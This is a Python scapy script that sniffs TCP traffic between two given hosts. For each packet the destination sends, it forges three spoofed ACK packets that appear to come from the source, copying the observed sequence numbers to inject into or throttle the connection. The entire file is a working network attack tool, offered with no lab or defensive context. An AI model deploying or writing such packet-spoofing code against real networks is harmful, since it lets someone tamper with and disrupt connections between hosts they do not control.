#!/usr/bin/sudo python

from scapy.all import *
from scapy.layers.inet import TCP, IP

from filter import TrafficFilter, CallBackFilter

src = '192.168.1.63'
dst = '192.168.1.94'

verbose = True


def log(data: str):
    if verbose:
        print(data)


def throttle_data_from_destination(pkt: Packet):
    ip, tcp = pkt[IP], pkt[TCP]

    # verify that the DST sent packet to SRC
    if ip.src != dst or ip.dst != src:
        return

    throttle(pkt)


def throttle(pkt: Packet):
    try:
        ip, tcp = pkt[IP], pkt[TCP]
        for i in range(0, 3):
            new_ip = IP(src=ip.dst, dst=ip.src)
            new_tcp = TCP(dport=tcp.sport,
                          sport=tcp.dport,
                          seq=tcp.ack,
                          ack=tcp.seq + 1 + len(tcp.payload),
                          flags='A')

            send(new_ip / new_tcp, verbose=False)
            log(f'> {format_packet((ip / tcp))}')
    except Exception as ex:
        log(f'Exception during packet sending: {ex}')


def format_packet(pkt: Packet, print_payload: bool = False) -> str:
    ip, tcp = pkt[IP], pkt[TCP]
    result = f'{pkt.summary()} --> FLAG {tcp.flags}, SEQ {tcp.seq}, ACK {tcp.ack}, PAY: {len(tcp.payload)}'
    if tcp.payload and print_payload:
        result += f'---\n{tcp.payload}\n---'
    return result


def custom_callback(pkt: Packet):
    ip, tcp = pkt[IP], pkt[TCP]

    log(f'< {format_packet(pkt, False)}')

    for ignored_flag in {'S', 'SA', 'R'}:
        # we need to use this, in set does not work
        if tcp.flags == ignored_flag:
            return

    throttle_data_from_destination(pkt)


if __name__ == '__main__':
    # 1st argument is the source
    # 2nd argument is the destination
    if len(sys.argv) >= 3:
        src = sys.argv[1]
        dst = sys.argv[2]
        if len(sys.argv) >= 4:
            verbose = True
    else:
        print('1st argument for source, 2nd for destination IP')
        print(sys.argv)
        exit(1)
    tf = TrafficFilter(src=src, dst=dst)
    cb = CallBackFilter(tf, callback=custom_callback)
    print(f'Executing sniffing between SRC: {src} and DST {dst}')
    sniff(prn=cb.callback, filter="tcp")
